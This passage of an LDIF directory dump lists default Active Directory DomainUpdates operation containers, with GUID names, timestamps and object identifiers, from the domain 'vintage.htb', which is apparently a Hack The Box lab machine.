name: 293f0798-ea5c-4455-9f5d-45f33a30703b
objectGUID:: nHhiAGRMs0KRE59QGpaqUw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 5c82b233-75fc-41b3-ac71-c69592e6bf15, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=5c82b233-75fc-41b3-ac71-c69592e6bf15,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 5c82b233-75fc-41b3-ac71-c69592e6bf15
distinguishedName: CN=5c82b233-75fc-41b3-ac71-c69592e6bf15,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5733
uSNChanged: 5733
showInAdvancedViewOnly: TRUE
name: 5c82b233-75fc-41b3-ac71-c69592e6bf15
objectGUID:: 9LepsWA9tUyRcNG0Oan4uw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 7ffef925-405b-440a-8d58-35e8cd6e98c3, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=7ffef925-405b-440a-8d58-35e8cd6e98c3,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 7ffef925-405b-440a-8d58-35e8cd6e98c3
distinguishedName: CN=7ffef925-405b-440a-8d58-35e8cd6e98c3,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5734
uSNChanged: 5734
showInAdvancedViewOnly: TRUE
name: 7ffef925-405b-440a-8d58-35e8cd6e98c3
objectGUID:: 7LyJ/JMYREaiNEVWBhKsLw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 4dfbb973-8a62-4310-a90c-776e00f83222, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=4dfbb973-8a62-4310-a90c-776e00f83222,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 4dfbb973-8a62-4310-a90c-776e00f83222
distinguishedName: CN=4dfbb973-8a62-4310-a90c-776e00f83222,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5735
uSNChanged: 5735
showInAdvancedViewOnly: TRUE
name: 4dfbb973-8a62-4310-a90c-776e00f83222
objectGUID:: sqIT2A3lAkOk/hHYpBw90g==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 8437C3D8-7689-4200-BF38-79E4AC33DFA0, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=8437C3D8-7689-4200-BF38-79E4AC33DFA0,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 8437C3D8-7689-4200-BF38-79E4AC33DFA0
distinguishedName: CN=8437C3D8-7689-4200-BF38-79E4AC33DFA0,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5736
uSNChanged: 5736
showInAdvancedViewOnly: TRUE
name: 8437C3D8-7689-4200-BF38-79E4AC33DFA0
objectGUID:: v5czDfPyf0WP/wa84veIwQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 7cfb016c-4f87-4406-8166-bd9df943947f, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=7cfb016c-4f87-4406-8166-bd9df943947f,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 7cfb016c-4f87-4406-8166-bd9df943947f
distinguishedName: CN=7cfb016c-4f87-4406-8166-bd9df943947f,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5737
uSNChanged: 5737
showInAdvancedViewOnly: TRUE
name: 7cfb016c-4f87-4406-8166-bd9df943947f
objectGUID:: Bhyp94THXEGwYKikFs7Htg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# f7ed4553-d82b-49ef-a839-2f38a36bb069, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=f7ed4553-d82b-49ef-a839-2f38a36bb069,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: f7ed4553-d82b-49ef-a839-2f38a36bb069
distinguishedName: CN=f7ed4553-d82b-49ef-a839-2f38a36bb069,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5738
uSNChanged: 5738
showInAdvancedViewOnly: TRUE
name: f7ed4553-d82b-49ef-a839-2f38a36bb069
objectGUID:: IGq7tRfcx0i2X0jBQTLCkg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 8ca38317-13a4-4bd4-806f-ebed6acb5d0c, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=8ca38317-13a4-4bd4-806f-ebed6acb5d0c,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 8ca38317-13a4-4bd4-806f-ebed6acb5d0c
distinguishedName: CN=8ca38317-13a4-4bd4-806f-ebed6acb5d0c,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5739
uSNChanged: 5739
showInAdvancedViewOnly: TRUE
name: 8ca38317-13a4-4bd4-806f-ebed6acb5d0c
objectGUID:: 8KIvE83YZ0C4OfxJ4OCRbA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 3c784009-1f57-4e2a-9b04-6915c9e71961, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=3c784009-1f57-4e2a-9b04-6915c9e71961,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 3c784009-1f57-4e2a-9b04-6915c9e71961
distinguishedName: CN=3c784009-1f57-4e2a-9b04-6915c9e71961,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5740
uSNChanged: 5740
showInAdvancedViewOnly: TRUE
name: 3c784009-1f57-4e2a-9b04-6915c9e71961
objectGUID:: rrr4JQXuWUC8pm0SFn1u3Q==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5678-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5678-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5678-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5678-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5741
uSNChanged: 5741
showInAdvancedViewOnly: TRUE
name: 6bcd5678-8314-11d6-977b-00c04f613221
objectGUID:: 8rCgZCLCnk6MXLr6NE2DRw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5679-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5679-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5679-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5679-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5742
uSNChanged: 5742
showInAdvancedViewOnly: TRUE
name: 6bcd5679-8314-11d6-977b-00c04f613221
objectGUID:: LdtNBuIW9EKoALPd2ENpsw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd567a-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd567a-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd567a-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd567a-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5743
uSNChanged: 5743
showInAdvancedViewOnly: TRUE
name: 6bcd567a-8314-11d6-977b-00c04f613221
objectGUID:: 7N5thvZZdke8wm4MAIS9vg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd567b-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd567b-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd567b-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd567b-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5744
uSNChanged: 5744
showInAdvancedViewOnly: TRUE
name: 6bcd567b-8314-11d6-977b-00c04f613221
objectGUID:: V0un/169FU+mqJdAoQkCcg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd567c-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd567c-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd567c-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd567c-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5745
uSNChanged: 5745
showInAdvancedViewOnly: TRUE
name: 6bcd567c-8314-11d6-977b-00c04f613221
objectGUID:: JrJI83sqpkSpWMgTPgwCCA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd567d-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd567d-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd567d-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd567d-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5746
uSNChanged: 5746
showInAdvancedViewOnly: TRUE
name: 6bcd567d-8314-11d6-977b-00c04f613221
objectGUID:: ykLI9CX3F0CbvTxOak75uQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd567e-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd567e-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd567e-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd567e-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5747
uSNChanged: 5747
showInAdvancedViewOnly: TRUE
name: 6bcd567e-8314-11d6-977b-00c04f613221
objectGUID:: Uh3UK323n0GuKRivj/i5Xg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd567f-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd567f-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd567f-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd567f-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5748
uSNChanged: 5748
showInAdvancedViewOnly: TRUE
name: 6bcd567f-8314-11d6-977b-00c04f613221
objectGUID:: n74NUN4rO0CFLYRTUGtFDg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5680-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5680-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5680-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5680-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5749
uSNChanged: 5749
showInAdvancedViewOnly: TRUE
name: 6bcd5680-8314-11d6-977b-00c04f613221
objectGUID:: furi0PrIIUW/21TgsDdiiA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5681-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5681-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5681-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5681-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5750
uSNChanged: 5750
showInAdvancedViewOnly: TRUE
name: 6bcd5681-8314-11d6-977b-00c04f613221
objectGUID:: sgCI1sS9YEai4+bYWhuDQg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5682-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5682-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5682-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5682-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5751
uSNChanged: 5751
showInAdvancedViewOnly: TRUE
name: 6bcd5682-8314-11d6-977b-00c04f613221
objectGUID:: AEnuTSyh6Uqz2XfiQ+siNg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5683-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5683-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5683-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5683-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5752
uSNChanged: 5752
showInAdvancedViewOnly: TRUE
name: 6bcd5683-8314-11d6-977b-00c04f613221
objectGUID:: gycJGH0ACke5Dn8BaBKE6A==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5684-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5684-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5684-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5684-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5753
uSNChanged: 5753
showInAdvancedViewOnly: TRUE
name: 6bcd5684-8314-11d6-977b-00c04f613221
objectGUID:: umHPVwW2DkCx/aYdOzlVIw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5685-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5685-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5685-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5685-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5754
uSNChanged: 5754
showInAdvancedViewOnly: TRUE
name: 6bcd5685-8314-11d6-977b-00c04f613221
objectGUID:: 3yWWfiZH+EKcULJGBILziQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5686-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5686-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5686-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5686-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5755
uSNChanged: 5755
showInAdvancedViewOnly: TRUE
name: 6bcd5686-8314-11d6-977b-00c04f613221
objectGUID:: OVFVdgKd8UWxDlqV4szrog==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5687-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5687-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5687-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5687-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5756
uSNChanged: 5756
showInAdvancedViewOnly: TRUE
name: 6bcd5687-8314-11d6-977b-00c04f613221
objectGUID:: 36rv9UmRRkmOudW6frchNw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5688-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5688-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5688-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5688-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5757
uSNChanged: 5757
showInAdvancedViewOnly: TRUE
name: 6bcd5688-8314-11d6-977b-00c04f613221
objectGUID:: vc9KH3wMb0i6zL+iVmxvDw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd5689-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd5689-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd5689-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd5689-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5758
uSNChanged: 5758
showInAdvancedViewOnly: TRUE
name: 6bcd5689-8314-11d6-977b-00c04f613221
objectGUID:: soej9YyVhEKLiFuLjT99iA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd568a-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd568a-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd568a-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568a-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5759
uSNChanged: 5759
showInAdvancedViewOnly: TRUE
name: 6bcd568a-8314-11d6-977b-00c04f613221
objectGUID:: Ltf+woQTl0G1Lp8NpJSmaA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd568b-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd568b-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd568b-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568b-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5760
uSNChanged: 5760
showInAdvancedViewOnly: TRUE
name: 6bcd568b-8314-11d6-977b-00c04f613221
objectGUID:: jK16InjC3UW8NgpOczVqlA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd568c-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd568c-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd568c-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568c-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5761
uSNChanged: 5761
showInAdvancedViewOnly: TRUE
name: 6bcd568c-8314-11d6-977b-00c04f613221
objectGUID:: 8nLuOcadOk2mb9Y44H027A==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6bcd568d-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6bcd568d-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6bcd568d-8314-11d6-977b-00c04f613221
distinguishedName: CN=6bcd568d-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5762
uSNChanged: 5762
showInAdvancedViewOnly: TRUE
name: 6bcd568d-8314-11d6-977b-00c04f613221
objectGUID:: rvHDkkAQSUeUbVGwAPr0Ew==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=3051c66f-b332-4a73-9a20-2d6a7d6e6a1c,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
distinguishedName: CN=3051c66f-b332-4a73-9a20-2d6a7d6e6a1c,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5763
uSNChanged: 5763
showInAdvancedViewOnly: TRUE
name: 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
objectGUID:: ryGeGm+hlE6xrxdHwZvn4A==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 3e4f4182-ac5d-4378-b760-0eab2de593e2, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=3e4f4182-ac5d-4378-b760-0eab2de593e2,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 3e4f4182-ac5d-4378-b760-0eab2de593e2
distinguishedName: CN=3e4f4182-ac5d-4378-b760-0eab2de593e2,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5764
uSNChanged: 5764
showInAdvancedViewOnly: TRUE
name: 3e4f4182-ac5d-4378-b760-0eab2de593e2
objectGUID:: fm7eyARl4Emeqr5iE9iufw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# c4f17608-e611-11d6-9793-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=c4f17608-e611-11d6-9793-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: c4f17608-e611-11d6-9793-00c04f613221
distinguishedName: CN=c4f17608-e611-11d6-9793-00c04f613221,CN=Operations,CN=Do
